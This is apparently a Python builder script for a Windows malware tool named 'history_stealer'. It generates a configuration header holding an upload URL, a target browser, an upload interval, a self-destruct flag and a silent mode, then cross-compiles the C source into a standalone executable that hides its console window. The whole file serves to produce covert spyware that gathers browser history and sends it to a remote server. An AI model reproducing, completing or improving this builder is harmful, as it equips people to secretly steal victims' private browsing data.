import subprocess
import os

def check_mingw():
    """Check if MinGW-w64 is installed."""
    try:
        result = subprocess.run(["x86_64-w64-mingw32-gcc", "--version"], capture_output=True, text=True)
        return result.returncode == 0
    except FileNotFoundError:
        return False

def generate_config_h(config):
    """Generate config.h based on config dict."""
    config_content = f"""#ifndef CONFIG_H
#define CONFIG_H

#define UPLOAD_URL "{config['upload_url']}"
#define TARGET_BROWSER {config['target_browser']}
#define UPLOAD_INTERVAL_HOURS {config['upload_interval_hours']}
#define SELF_DESTRUCT {config['self_destruct']}
{'#define SILENT' if config['silent'] == '1' else ''}

#endif
"""
    with open("history_stealer/config.h", "w") as f:
        f.write(config_content)

def compile_program(silent):
    """Compile the C program."""
    source_file = "history_stealer/main.c"
    output_file = "history_stealer/history_stealer.exe"
    
    if not os.path.exists(source_file):
        raise Exception(f"Source file {source_file} not found.")
    
    if not os.path.exists("history_stealer/config.h"):
        raise Exception("config.h not found.")

    cmd = [
        "x86_64-w64-mingw32-gcc",
        source_file,
        "-o", output_file,
        "-Ihistory_stealer/deps",  # Include path for headers
        "-Lhistory_stealer/deps",  # Library path
        "-lcurl", "-lz", "-lminizip",  # Static libraries in deps
        "-lshlwapi", "-lshell32",  # Windows system libraries
        "-static",  # Static linking for standalone executable
        "-DUNICODE", "-D_UNICODE"
    ]
    
    if silent:
        cmd.append("-mwindows")
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        return {"success": True, "output": result.stdout}
    except subprocess.CalledProcessError as e:
        raise Exception(f"Compilation failed: {e.stderr}")